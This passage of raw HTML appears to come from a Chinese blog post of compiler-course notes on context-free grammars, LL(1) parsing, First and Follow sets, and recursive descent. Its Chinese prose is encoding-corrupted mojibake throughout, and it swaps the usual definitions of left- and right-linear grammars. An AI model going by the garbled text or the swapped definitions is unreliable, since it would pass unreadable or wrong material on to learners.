N)^*$<br>Sï¼šå¼€å§‹ç¬¦å·(Startsymbol): $ S \\in N $</p>\n<blockquote>\n<p>ğŸ“•â€œä¸Šä¸‹æ–‡æ— å…³â€ä½“ç°åœ¨ï¼šäº§ç”Ÿå¼å·¦ä¾§åªæœ‰ä¸€ä¸ªéç»ˆç»“ç¬¦ï¼Œå› æ­¤ç±»ä¼¼ $xAy\\rightarrow xay$è¿™æ ·ï¼Œéœ€è¦å…³å¿ƒç¬¦å·å‰ååˆ«çš„ç¬¦å·æ˜¯ä»€ä¹ˆæ‰èƒ½åº”ç”¨çš„äº§ç”Ÿå¼æ˜¯ä¸èƒ½åœ¨CFGé‡Œçš„ã€‚</p>\n</blockquote>\n<ul>\n<li>ç‰¹æ®Šç¬¦å·ï¼š$ &#x3D;end of file(EOF)<br>æ·»åŠ ä¸€ä¸ªæ–°ç¬¦å·Sâ€™ä¸ä¸€æ¡æ–°è§„åˆ™ä»¥è¡¨æ˜å¿…é¡»åœ¨å°¾éƒ¨ï¼š<ul>\n<li>$ Sâ€™ \\rightarrow S$ $</li>\n</ul>\n</li>\n<li>äº§ç”Ÿå¼ç¼©å†™ï¼šå·¦ä¾§ä¸€æ ·çš„äº§ç”Ÿå¼å¯ä»¥æŠŠå³ä¾§ä½¿ç”¨â€|â€åˆå¹¶ã€‚ä¾‹å¦‚ $E\\rightarrow E+E|(E)|id$</li>\n</ul>\n<h3 id=\"æ¨å¯¼Derivationå’Œè§„çº¦Reduction\"><a href=\"#æ¨å¯¼Derivationå’Œè§„çº¦Reduction\" class=\"headerlink\" title=\"æ¨å¯¼Derivationå’Œè§„çº¦Reduction\"></a>æ¨å¯¼Derivationå’Œè§„çº¦Reduction</h3><p>ä¾‹å¦‚æœ‰äº§ç”Ÿå¼ $A\\rightarrow \\gamma$ï¼Œæˆ‘ä»¬å¯ä»¥æœ‰ $\\alpha A \\beta \\Rightarrow \\alpha \\gamma \\beta$<br>é‚£ä¹ˆæˆ‘ä»¬è¯´ï¼š</p>\n<ul>\n<li>$\\alpha A \\beta $ <strong>ç›´æ¥æ¨å¯¼</strong>åˆ° $ \\alpha \\gamma \\beta$</li>\n<li>$\\alpha \\gamma \\beta $ <strong>ç›´æ¥è§„çº¦</strong>åˆ° $  \\alpha A \\beta$<br>ä¸è¨€è€Œå–»çš„<strong>å¤šæ­¥æ¨å¯¼è®°å·</strong>ï¼š$\\Rightarrow^5$ $\\Rightarrow^+$ $\\Rightarrow^*$<br>åˆ†åˆ«ä»£è¡¨äº”æ­¥æ¨å¯¼ï¼Œè‡³å°‘ä¸€æ­¥æ¨å¯¼ï¼Œ0æ¬¡æˆ–æ›´å¤šæ¬¡æ¨å¯¼</li>\n<li>æ¨å¯¼&#x3D;ä»æ–‡æ³•ç”Ÿæˆè¯­è¨€é‡Œçš„å¥å­ï¼Œè§„çº¦&#x3D;è¯†åˆ«å¥å­æˆåˆ†å¹¶é€æ¸è§„çº¦åˆ°å¼€å§‹ç¬¦å·</li>\n</ul>\n<ol>\n<li><p>æœ€å·¦æ¨å¯¼Left-most Derivation</p>\n<ul>\n<li>æœ€å·¦æ¨å¯¼&#x3D;æ¯æ­¥ä»£æ¢æœ€å·¦è¾¹çš„éç»ˆç»“ç¬¦ã€‚é€†è¿‡ç¨‹ä¸ºæœ€å³è§„çº¦</li>\n<li>ç±»æ¯”å¯å¾—å‡ºæœ€å³æ¨å¯¼ã€æœ€å·¦è§„çº¦çš„å®šä¹‰</li>\n<li>åœ¨è‡ªé¡¶å‘ä¸‹çš„åˆ†æä¸­ï¼Œæ€»æ˜¯é‡‡ç”¨<strong>æœ€å·¦æ¨å¯¼</strong>ï¼›åœ¨è‡ªåº•å‘ä¸Šçš„åˆ†æä¸­ï¼Œæ€»æ˜¯é‡‡ç”¨<strong>æœ€å·¦å½’çº¦</strong></li>\n</ul>\n<p> <img src=\"/compiler-construction-principles/lmrm.png\" alt=\"left-most derive\" loading=\"lazy\"></p>\n</li>\n<li><p>å¥å‹ å¥å­ è¯­è¨€</p>\n<ul>\n<li>å¥å‹(Sentential form) &#x3D; æ–‡æ³•Gä¸‹å¯èƒ½æ¨å¯¼å‡ºçš„ä¸€ä¸ªç¬¦å·åºåˆ—ï¼šå¯èƒ½åŒ…å«ç»ˆç»“ç¬¦&#x2F;éç»ˆç»“ç¬¦ï¼Œå¯ä¸ºç©º</li>\n<li>å¥å­(Sentence) &#x3D; ä¸å«éç»ˆç»“ç¬¦çš„å¥å‹ï¼ˆä»…å«ç»ˆç»“ç¬¦ï¼‰</li>\n<li>è¯­è¨€(Language) &#x3D; æ–‡æ³•Gå¯äº§ç”Ÿçš„æ‰€æœ‰å¥å­çš„é›†åˆ</li>\n</ul>\n</li>\n<li><p>æ­£åˆ™æ–‡æ³•(RE) ä¸ ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•(CFG)</p>\n<ul>\n<li>ä¸Šä¸‹æ–‡æ— å…³è¯­è¨€L(G) :&#x3D; CFGäº§ç”Ÿçš„æ‰€æœ‰å¥å­çš„é›†åˆ</li>\n<li>æ­£åˆ™è¯­è¨€L(r) :&#x3D; REäº§ç”Ÿçš„æ‰€æœ‰å¥å­çš„é›†åˆ<ul>\n<li>RE &#x3D; Regex Expression &#x3D; æ­£åˆ™è¡¨è¾¾å¼</li>\n<li>æ­£åˆ™è¡¨è¾¾å¼rå®šä¹‰æ­£åˆ™è¯­è¨€L(r)</li>\n<li>$ L(r) \\in L(G) $ï¼šå› ä¸ºæ­£åˆ™å¯¹äº§ç”Ÿå¼é™åˆ¶æ›´å¤§ï¼Œå¿…é¡»ä¸º( $A,B \\in N, a \\in T\\cup {\\epsilon} $ )ï¼š<ul>\n<li>å·¦çº¿æ€§æ–‡æ³•ï¼šå½¢å¦‚ $A\\rightarrow aB$ æˆ– $A\\rightarrow a$</li>\n<li>å³çº¿æ€§æ–‡æ³•ï¼šå½¢å¦‚ $A\\rightarrow Ba$ æˆ– $A\\rightarrow a$</li>\n</ul>\n</li>\n<li>æ­£åˆ™è¯­è¨€å¯ç”¨äºè¯æ³•åˆ†æï¼Œä¸Šä¸‹æ–‡æ— å…³è¯­è¨€å¯ç”¨äºè¯­æ³•åˆ†æï¼ˆè¯­è¨€æè¿°èƒ½åŠ›ã€å¤æ‚æ€§å†³å®šçš„ï¼‰</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>ChomskyèŒƒå¼ï¼ˆè®¡ç®—ç†è®ºè¯¾ç¨‹å†…å®¹ï¼‰:</p>\n<ul>\n<li>0å‹æ–‡æ³•&#x3D;çŸ­è¯­ç»“æ„æ–‡æ³• é€’å½’å¯æšä¸¾</li>\n<li>1å‹æ–‡æ³•&#x3D;ä¸Šä¸‹æ–‡æœ‰å…³æ–‡æ³•</li>\n<li>2å‹æ–‡æ³•&#x3D;CFG</li>\n<li>3å‹æ–‡æ³•&#x3D;RE</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"CFGçš„åˆ†ææ ‘Parse-Tree\"><a href=\"#CFGçš„åˆ†ææ ‘Parse-Tree\" class=\"headerlink\" title=\"CFGçš„åˆ†ææ ‘Parse Tree\"></a>CFGçš„åˆ†ææ ‘Parse Tree</h3><ul>\n<li><p>åˆ†ææ ‘æ€§è´¨</p>\n<ul>\n<li>æ ¹èŠ‚ç‚¹&#x3D;æ–‡æ³•åˆå§‹ç¬¦å·</li>\n<li>å¶èŠ‚ç‚¹&#x3D;ç»ˆç»“ç¬¦</li>\n<li>å†…éƒ¨èŠ‚ç‚¹&#x3D;éç»ˆç»“ç¬¦</li>\n<li>çˆ¶èŠ‚ç‚¹â†’{å¶èŠ‚ç‚¹}&#x3D;äº§ç”Ÿå¼</li>\n</ul>\n</li>\n<li><p>è¯­æ³•åˆ†æ(Parsing)ä¸­çš„æŒ‘æˆ˜<br><em>æ ¸å¿ƒç›®æ ‡ï¼šå¯¹äºç»ˆç»“ç¬¦å·ä¸²xï¼Œè¦ä¹ˆä»Sæ¨å¯¼å‡ºxï¼Œè¦ä¹ˆè®¾æ³•å°†xè§„çº¦åˆ°S</em>*</p>\n<ul>\n<li>è‡ªé¡¶å‘ä¸‹(Top-down) S-&gt;x, ä»<strong>æ ¹èŠ‚ç‚¹</strong>å¼€å§‹æ„é€ Parse Tree</li>\n<li>è‡ªåº•å‘ä¸Š(Bottom-up) x-&gt;S, ä»<strong>å¶èŠ‚ç‚¹</strong>å¼€å§‹æ„é€ Parse Tree</li>\n</ul>\n<p>ä½œä¸ºæœç´¢é—®é¢˜ï¼šæœç´¢ç©ºé—´å¤§-&gt;ç©ºé—´å¤§å°å—æ–‡æ³•äº§ç”Ÿå¼é™åˆ¶</p>\n<ul>\n<li>æ— é™åˆ¶ï¼šæ—¶é—´å¤æ‚åº¦ $O(n^3)$</li>\n<li>ä¸Šä¸‹æ–‡æ— å…³è¯­è¨€CFL çš„å­é›†éœ€è¦çš„å…¸å‹æ—¶é—´ä¸º $O(n)$ï¼Œä¾‹å¦‚<ul>\n<li>Predictive parsing using LL(1) grammars</li>\n<li>Shift-Reduce parsing using LR(1) grammars</li>\n<li>â€¦</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"ç¼–ç¨‹è¯­è¨€çš„æ–‡æ³•è®¾è®¡\"><a href=\"#ç¼–ç¨‹è¯­è¨€çš„æ–‡æ³•è®¾è®¡\" class=\"headerlink\" title=\"ç¼–ç¨‹è¯­è¨€çš„æ–‡æ³•è®¾è®¡\"></a>ç¼–ç¨‹è¯­è¨€çš„æ–‡æ³•è®¾è®¡</h3><p>æ ¸å¿ƒï¼š<strong>æ— äºŒä¹‰æ€§</strong></p>\n<ul>\n<li><p>äºŒä¹‰æ€§æ¥æºï¼šæŸäº›å¥å­å­˜åœ¨ä¸æ­¢ä¸€æ£µåˆ†ææ ‘&#x3D;æœ‰ä¸¤ä¸ªä¸åŒçš„æœ€å·¦æ¨å¯¼&#x3D;<strong>å¤šç§å¯é€‰æ¨å¯¼å¤„äºæ–‡æ³•åŒä¸€å±‚</strong><br>ä¾‹å¦‚ï¼š$$E \\Rightarrow E*E \\Rightarrow id*E \\Rightarrow id*E+E$$ ä¸ $$E \\Rightarrow E+E \\Rightarrow E*E+E \\Rightarrow id*E+E $$<br>å¯¹äºâ€3*4+5â€ï¼Œå‰è€…ç»™å‡º3*(4+5)&#x3D;27ï¼ˆé”™è¯¯ï¼‰ï¼Œåè€…ç»™å‡º3*4+5&#x3D;17ï¼ˆæ­£ç¡®ï¼‰ã€‚</p>\n</li>\n<li><p>è§£å†³åŠæ³•ï¼š</p>\n<ul>\n<li>ç¡®ä¿åªæœ‰ä¸€ç§æœ€å·¦æ¨å¯¼&#x3D;å°†åŒä¸€å±‚æ–‡æ³•åˆ†å±‚</li>\n<li>è§„å®šç¬¦å·ä¼˜å…ˆçº§ï¼ˆâ€*â€œâ€ &gt; â€œ+â€,â€-â€œï¼‰<ul>\n<li>è¶Šæ¥è¿‘å¼€å§‹ç¬¦å·Sçš„æ–‡æ³•ç¬¦å·ä¼˜å…ˆçº§è¶Šä½</li>\n</ul>\n</li>\n<li>è§„å®šç¬¦å·ç»“åˆæ€§ï¼ˆå·¦ç»“åˆ&#x2F;å³ç»“åˆï¼‰<ul>\n<li>é€’å½’éç»ˆç»“ç¬¦ï¼ˆä¹Ÿå°±æ˜¯è¿™ä¸ªç»ˆç»“ç¬¦åœ¨äº§ç”Ÿå¼å·¦éƒ¨å³éƒ¨éƒ½å‡ºç°ï¼‰åœ¨ç»ˆç»“ç¬¦ï¼ˆä¹Ÿå°±æ˜¯è¿™ä¸ªè¿ç®—ç¬¦ï¼Œæ¯”å¦‚<code>*</code>,<code>+</code>ï¼‰å·¦è¾¹ï¼Œè¿ç®—å°±å·¦ç»“åˆ</li>\n<li><img src=\"/compiler-construction-principles/priority.png\" alt=\"op priority\" loading=\"lazy\"></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>åˆ¤å®šCFGäºŒä¹‰æ€§ï¼šä¸å¯åˆ¤å®šé—®é¢˜<br>ä½†å¯ä»¥é€šè¿‡ç»™å®šå……åˆ†æ¡ä»¶ï¼ˆæ— äºŒä¹‰æ–‡æ³•ï¼‰ç¡®ä¿æ— äºŒä¹‰æ€§ï¼š</p>\n<ul>\n<li>è‡ªé¡¶å‘ä¸‹ï¼šLL(1)</li>\n<li>è‡ªåº•å‘ä¸Šï¼šLR(1), LALR(1)<br><a name=\"grammars-set\"></a><br><img src=\"/compiler-construction-principles/grammars.png\" alt=\"grammars\" loading=\"lazy\"></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Part-4-è¯­æ³•åˆ†æ-è‡ªé¡¶å‘ä¸‹\"><a href=\"#Part-4-è¯­æ³•åˆ†æ-è‡ªé¡¶å‘ä¸‹\" class=\"headerlink\" title=\"Part 4: è¯­æ³•åˆ†æ - è‡ªé¡¶å‘ä¸‹\"></a>Part 4: è¯­æ³•åˆ†æ - è‡ªé¡¶å‘ä¸‹</h2><p>è‡ªé¡¶å‘ä¸‹æ¯ä¸€æ­¥çš„æ¨å¯¼éƒ½éœ€è¦åšå‡º<strong>ä¸¤ä¸ªé€‰æ‹©</strong>ï¼š</p>\n<ul>\n<li>æ›¿æ¢å“ªä¸ªéç»ˆç»“ç¬¦ï¼Ÿ</li>\n<li>åº”ç”¨å“ªä¸ªï¼ˆå·¦ä¾§ä¸ºè¯¥ç»ˆç»“ç¬¦çš„ï¼‰äº§ç”Ÿå¼æ›¿æ¢ï¼Ÿ</li>\n</ul>\n<p>é€šç”¨å½¢å¼ï¼š<strong>é€’å½’ä¸‹é™åˆ†æ(Recursive-Descent Parsing)</strong></p>\n<ul>\n<li>å‘ç”Ÿé”™è¯¯ï¼ˆæ²¡æœ‰äº§ç”Ÿå¼å¯ä»¥äº§ç”Ÿåˆæ³•çš„å­èŠ‚ç‚¹ï¼‰å°±å›æº¯</li>\n<li>é—®é¢˜ï¼šå¤ªæ…¢ï¼</li>\n<li>è¯¥è¿‡ç¨‹ç±»ä¼¼NFAï¼Œèƒ½å¦æ„é€ ç±»ä¼¼DFAçš„åˆ†ææ–¹æ³•ï¼Ÿ</li>\n</ul>\n<h3 id=\"LL-1-å’Œé¢„æµ‹åˆ†ææ³•\"><a href=\"#LL-1-å’Œé¢„æµ‹åˆ†ææ³•\" class=\"headerlink\" title=\"LL(1)å’Œé¢„æµ‹åˆ†ææ³•\"></a>LL(1)å’Œé¢„æµ‹åˆ†ææ³•</h3><p>é¢„æµ‹åˆ†ææ³•(Predictive parsing)ï¼šæ¥å—LL(k)æ–‡æ³•</p>\n<ul>\n<li>ç¬¬ä¸€ä¸ªL: â€œleft to rightâ€ ä»å·¦åˆ°å³æ‰«æ</li>\n<li>ç¬¬äºŒä¸ªL: â€œleft-most derivationâ€ æœ€å·¦æ¨å¯¼</li>\n<li>k: å‘å‰çœ‹kä¸ªtokenç¡®å®šæ¨å¯¼é€‰ç”¨çš„äº§ç”Ÿå¼ï¼ˆä¸€èˆ¬ä¸æ˜ç¡®è¯´kå°±æ˜¯k&#x3D;1ï¼‰</li>\n</ul>\n<p>æ¥ä¸‹æ¥éœ€è¦æ·»åŠ çº¦æŸä½¿å…¶æ— éœ€å›æº¯ã€‚æˆ‘ä»¬å…ˆå¼•å…¥å‡ ä¸ªæ¦‚å¿µï¼š</p>\n<ul>\n<li><p>Firsté›†å’ŒFollowé›†</p>\n<p>ç»™å®š $ G&#x3D;(T,N,P,S),\\alpha \\in (T\\cup N)^* $<br><strong>è®°ç©ºä¸²ä¸º$\\epsilon$</strong></p>\n<ul>\n<li><p>Firsté›†ï¼šå¯ä»$\\alpha$æ¨å¯¼å¾—åˆ°çš„ä¸²çš„é¦–ä¸ªç»ˆç»“ç¬¦çš„é›†åˆï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œ$\\alpha$è‡ªå·±æ¨å¯¼å‡ºçš„ç¬¬ä¸€ä¸ªç»ˆç»“ç¬¦å¯èƒ½æ˜¯ä»€ä¹ˆï¼‰<br>$$ \\text{First}(\\alpha)&#x3D;{a| \\alpha \\Rightarrow^*aâ€¦\\ ,a\\in T} $$</p>\n</li>\n<li><p>Followé›†ï¼šä»Så‡ºå‘ï¼Œå¯èƒ½åœ¨æ¨å¯¼è¿‡ç¨‹ä¸­è·Ÿåœ¨Aå³è¾¹çš„ç»ˆç»“ç¬¦å·é›†<br>$$ \\text{Follow}(A)&#x3D;{a|S\\Rightarrow^*â€¦Aaâ€¦\\ ,a\\in T} $$</p>\n<ul>\n<li>ä¾‹å¦‚: $ S\\rightarrow \\alpha\\ A a\\ \\beta $ï¼Œç»ˆç»“ç¬¦å· $ a\\in \\text{Follow}(A) $ ï¼ˆä»”ç»†åŒºåˆ†aå’ŒÎ±ï¼‰</li>\n</ul>\n</li>\n</ul>\n<p>æˆ‘ä»¬è‡³æ­¤å¯ä»¥ä½¿ç”¨ä¸¤ä¸ªæ¡ä»¶ä¿è¯äº§ç”Ÿå¼çš„é€‰æ‹©æ˜¯å”¯ä¸€çš„ï¼š<br>å¯¹äºäº§ç”Ÿå¼ $ A\\rightarrow \\alpha|\\beta $ ,</p>\n<ol>\n<li>$ \\text{First}(\\alpha)\\cap \\text{First}(\\beta)&#x3D; \\emptyset $ ï¼ˆÎ±å’ŒÎ²æ¨å¯¼ä¸å‡ºä»¥åŒä¸€ä¸ªå•è¯ä¸ºé¦–çš„ä¸²ï¼‰<ul>\n<li>æ„ä¹‰ï¼šæ˜¾ç„¶çš„ã€‚è¿™æ ·çœ‹ç»ˆç»“ç¬¦æ˜¯å“ªä¸ªå°±çŸ¥é“åº”è¯¥ç”¨å“ªä¸ªäº§ç”Ÿå¼ã€‚</li>\n</ul>\n</li>\n<li>è‹¥$\\beta \\Rightarrow^* \\epsilon$ï¼Œé‚£ä¹ˆ$\\alpha \\nRightarrow^* \\epsilon$ï¼Œä¸” $ \\text{First}(\\alpha) \\cap Follow(A) &#x3D; \\emptyset $ ï¼ˆÎ±å’ŒÎ²ä¸èƒ½åŒæ—¶æ¨å‡º$\\epsilon$;First(Î±)ä¸åº”åœ¨Follow(A) ä¸­ï¼‰<ul>\n<li>æ„ä¹‰ï¼šå…¶å®å°±æ˜¯è€ƒè™‘å¦‚æœå¯ä»¥æ¨å¯¼å‡ºç©ºä¸²æ—¶ï¼Œåç»§ç»ˆç»“ç¬¦å› ä¸ºæ˜¯ç©ºä¸²æ‰€ä»¥æš‚æ—¶è¿˜æ²¡æ³•ç¡®å®šï¼Œå¾—ä»Followé›†ä¸­å¯»æ‰¾ï¼ˆå†å‘åçœ‹ï¼‰ï¼Œæœ€ç»ˆåšå‡ºå“ªä¸ªäº§ç”Ÿå¼çš„é€‰æ‹©ã€‚</li>\n<li>åœ¨<strong>æ»¡è¶³è¿™æ¡è¦æ±‚çš„æƒ…å†µä¸‹</strong>ï¼Œå‡è®¾ä¸‹ä¸€ä¸ªè¾“å…¥æ˜¯b,ä¸”$\\beta \\Rightarrow^* \\epsilon$<ul>\n<li>å¦‚æœbâˆˆFirst(Î±)ï¼Œåˆ™é€‰æ‹©A â†’ Î±(å±äºä¸Šé¢1çš„æƒ…å†µ)</li>\n<li>å¦‚æœbâˆˆFollow(A)ï¼Œåˆ™é€‰æ‹©A â†’ Î² ,è¿™å¯¹åº”Aæœ€ç»ˆåˆ°è¾¾äº†$\\epsilon$è€Œä¸”åé¢ç´§è·Ÿç€ç»ˆç»“ç¬¦bçš„æƒ…å†µ</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<p><strong>åº”è¯•å»ºè®®ï¼šç›´æ¥åˆ—å‡ºLL(1)åˆ†æè¡¨å¹¶æ£€æŸ¥æ˜¯å¦æœ‰<em>å†²çª</em>ï¼ˆè§ä¸‹æ–‡ï¼‰ã€‚</strong></p>\n</li>\n</ul>\n<p>æ¥ä¸‹æ¥æˆ‘ä»¬ä¼šçœ‹åˆ°å…·ä½“çš„LL(1)é¢„æµ‹åˆ†æå®ç°æ–¹å¼ã€‚<br><strong>ä¸‰æ­¥èµ°ï¼šè®¡ç®—First,Follow-&gt;æ„é€ é¢„æµ‹åˆ†æè¡¨-&gt;é¢„æµ‹åˆ†æ</strong></p>\n<ol>\n<li><p>è®¡ç®—First, Follow</p>\n<ul>\n<li><p>Nullableé›†<br>  ç”±äºåˆšåˆšæåˆ°äº†ç©ºä¸²ï¼Œæˆ‘ä»¬éœ€è¦å¼•å…¥ä¸€ä¸ªç®€å•çš„æ–°å®šä¹‰ï¼šNullableé›†&#x3D;{å¯æ¨å¯¼å‡ºç©ºä¸²çš„ç¬¦å·}ã€‚<br>  å®šä¹‰æ˜¯é€’å½’çš„ï¼š</p>\n<ul>\n<li>Base Case: å¦‚æœæœ‰äº§ç”Ÿå¼ $ X\\rightarrow \\epsilon$, é‚£ä¹ˆXå½“ç„¶æ˜¯Nullableçš„</li>\n<li>Inductive Case: å¦‚æœæœ‰äº§ç”Ÿå¼ $ X\\rightarrow Y_1 Y_2 Y_3 â€¦ Y_n$, ä¸” $Y_1,Y_2,Y_3,â€¦,Y_n$<strong>æ¯ä¸ªéƒ½èƒ½</strong>æ¨å¯¼å‡ºç©ºä¸²ï¼Œåˆ™Xæ˜¯Nullableçš„</li>\n<li>å¯¹äºæ¯ä¸ªäº§ç”Ÿå¼ï¼Œæˆ‘ä»¬å¯ä»¥å¾ªç¯ç”¨å®ƒä»¬ä¸æ–­æ›´æ–°Nullableé›†ç›´åˆ°ä¸åŠ¨ç‚¹ã€‚è¿™åŒæ ·é€‚ç”¨äºFirsté›†ä¸Followé›†ã€‚</li>\n</ul>\n</li>\n<li><p>Firsté›†ï¼š</p>\n<ul>\n<li>Base Case: å¦‚æœXæ˜¯ç»ˆç»“ç¬¦terminal: First(X)&#x3D;{X}</li>\n<li>Inductive Case: å¦‚æœæœ‰äº§ç”Ÿå¼ $ X\\rightarrow Y_1 Y_2 Y_3 â€¦ Y_n$<ul>\n<li>é¦–å…ˆï¼Œ$\\text{First}(X) \\cup &#x3D; \\text{First}(Y_1)$ ($ a\\cup &#x3D; b$æ„ä¸º$ a \\leftarrow a\\cup b$ï¼Œä¹Ÿå°±æ˜¯æŠŠbå¹¶è¿›aé‡Œ)</li>\n<li>å¦‚æœ$Y_1 \\in \\text{Nullable}: $$\\text{First}(X) \\cup &#x3D; \\text{First}(Y_2)$</li>\n<li>å¦‚æœ$Y_1,Y_2 \\in \\text{Nullable}: $$\\text{First}(X) \\cup &#x3D; \\text{First}(Y_3)$</li>\n<li>â€¦</li>\n<li>ç›´åˆ°æŸä¸ª$Y_i \\notin \\text{Nullable}$åˆ™åœæ­¢</li>\n</ul>\n</li>\n<li>å¯¹äºæ¯ä¸ªäº§ç”Ÿå¼ï¼Œæˆ‘ä»¬å¯ä»¥å¾ªç¯ç”¨å®ƒä»¬ä¸æ–­æ›´æ–°Firsté›†ç›´åˆ°ä¸åŠ¨ç‚¹ã€‚</li>\n</ul>\n</li>\n<li><p>Followé›†ï¼š</p>\n<ul>\n<li>Base Case: $ \\text{Follow}(A)&#x3D;\\emptyset $</li>\n<li>Inductive Case: å¦‚æœæœ‰äº§ç”Ÿå¼ $ B\\rightarrow s_1 A\\ s_2 $<ul>\n<li>$\\text{Follow}(A) \\cup &#x3D; \\text{First}(s_2)$</li>\n<li>å¦‚æœ$s_2 \\in \\text{Nullable}$, $\\text{Follow}(A) \\cup &#x3D; \\text{Follow}(B)$</li>\n</ul>\n</li>\n<li>å¯¹äºæ¯ä¸ªäº§ç”Ÿå¼ï¼Œæˆ‘ä»¬å¯ä»¥å¾ªç¯ç”¨å®ƒä»¬ä¸æ–­æ›´æ–°Followé›†ç›´åˆ°ä¸åŠ¨ç‚¹ã€‚</li>\n</ul>\n</li>\n</ul>\n<p> Tips(ä¸è¦æ±‚æŒæ¡):Tiger book algorithm 3.13æŒ‡å‡ºä»–ä»¬å¯ä»¥åŒæ—¶è®¡ç®—ï¼Œæ„Ÿå…´è¶£å¯ä»¥çœ‹çœ‹ã€‚</p>\n</li>\n<li><p>æ„é€ é¢„æµ‹åˆ†æè¡¨</p>\n<ul>\n<li><p><del>æ‰“å¼€ç½‘ç«™å³å¯<a href=\"https://jsmachines.sourceforge.net/machines/ll1.html\">LL(1) Parser Generator</a></del> ä¸è¿‡è¿™ä¸ªç½‘ç«™ç¡®å®å¯¹äºç†è§£ç¬¬ä¸‰æ­¥ä¸­PDAç›¸å…³è¿‡ç¨‹å¾ˆæœ‰å¸®åŠ©ã€‚</p>\n</li>\n<li><p>å›é¡¾è‡ªé¡¶å‘ä¸‹æ¨å¯¼çš„ä¸¤ä¸ªé€‰æ‹©é¢˜ï¼š</p>\n<ul>\n<li>Q: æ›¿æ¢å½“å‰å¥å‹ä¸­çš„å“ªä¸ªéç»ˆç»“ç¬¦? A: â€œLeft-mostâ€ä¸€è¯è¯´æ˜ï¼šæ€»æ˜¯é€‰æ‹©æ¯ä¸ªå¥å‹çš„æœ€å·¦éç»ˆç»“ç¬¦è¿›è¡Œæ›¿æ¢ã€‚</li>\n<li>Q: ç”¨è¯¥éç»ˆç»“ç¬¦çš„å“ªä¸ªäº§ç”Ÿå¼è¿›è¡Œæ›¿æ¢? A: æ„å»ºäºŒç»´è¡¨M, é€šè¿‡å½“å‰éç»ˆç»“ç¬¦å’Œçœ‹åˆ°çš„ç»ˆç»“ç¬¦å†³å®šé€‰å–ä½•ç§äº§ç”Ÿå¼ã€‚</li>\n</ul>\n</li>\n<li><p>å®šä¹‰å¹¶æ„é€ Mï¼š</p>\n<ul>\n<li>æ¯ä¸€è¡ŒAå¯¹åº”ä¸€ä¸ªéç»ˆç»“ç¬¦</li>\n<li>æ¯ä¸€åˆ—aå¯¹åº”æŸä¸ªç»ˆç»“ç¬¦æˆ–è¾“å…¥ç»“æŸç¬¦<code>$</code></li>\n<li>è¡¨ä¸­çš„æŸä¸€æ ¼M[A,a]è¡¨ç¤ºï¼šé’ˆå¯¹å½“å‰éç»ˆç»“ç¬¦Aï¼Œä¸‹ä¸€ä¸ªè¾“å…¥Tokenä¸ºç»ˆç»“ç¬¦aæ—¶ï¼Œå¯é€‰çš„äº§ç”Ÿå¼é›†åˆ<br><img src=\"/compiler-construction-principles/tableM.png\" alt=\"M table\" loading=\"lazy\"></li>\n<li>æ„é€ è¿‡ç¨‹ï¼šå¯¹äºæ¯ä¸ªäº§ç”Ÿå¼ $X\\rightarrow \\gamma$<ul>\n<li>å¦‚æœ $ t\\in \\text{First}(\\gamma)$, æ’å…¥äº§ç”Ÿå¼ $X\\rightarrow \\gamma$ åˆ°M[X,t]</li>\n<li>å¦‚æœ $ \\gamma \\in \\text{Nullable} $ ä¸” $t \\in \\text{Follow}(X)$, æ’å…¥äº§ç”Ÿå¼ $X\\rightarrow \\gamma$ åˆ°M[X,t]</li>\n</ul>\n</li>\n<li><strong>å¦‚æœæŸä¸€æ ¼å­˜åœ¨å¤šä¸ªäº§ç”Ÿå¼ï¼Œå°±è¯´æ˜æ— æ³•ç¡®å®šé€‰å–å“ªä¸ªäº§ç”Ÿå¼ï¼ˆä¹Ÿå³ï¼šäº§ç”Ÿäº†<em>å†²çª</em>ï¼‰ï¼Œä¹Ÿå°±è¯´æ˜ä¸æ˜¯LL(1)æ–‡æ³•ï¼</strong></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>é¢„æµ‹åˆ†æ</p>\n<ul>\n<li><p>é€’å½’ä¸‹é™</p>\n<ul>\n<li>ä¾‹å¦‚å¯¹äºæ–‡æ³•ï¼š</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">S -&gt; E $</span><br><span class=\"line\">E -&gt; E + T</span><br><span class=\"line\">E -&gt; E â€“ T</span><br><span class=\"line\">E -&gt; T</span><br><span class=\"line\">T -&gt; T * F</span><br><span class=\"line\">T -&gt; T / F</span><br><span class=\"line\">T -&gt; F</span><br><span class=\"line\">F -&gt; id</span><br><span class=\"line\">F -&gt; num</span><br><span class=\"line\">F -&gt; ( E )</span><br></pre></td></tr></table></figure>\n\n<p>å½¢å¦‚ï¼š</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">S</span><span class=\"params\">(<span class=\"type\">void</span>)</span> &#123; E(); eat(EOF); &#125; </span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">E</span><span class=\"params\">(<span class=\"type\">void</span>)</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">switch</span>(tok) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">case</span> ?: E(); eat(PLUS); T(); <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> ?: E(); eat(MINUS); T(); <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> ?: T(); <span class=\"keyword\">break</span>; </span><br><span class=\"line\">    <span class=\"keyword\">default</span>: error();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 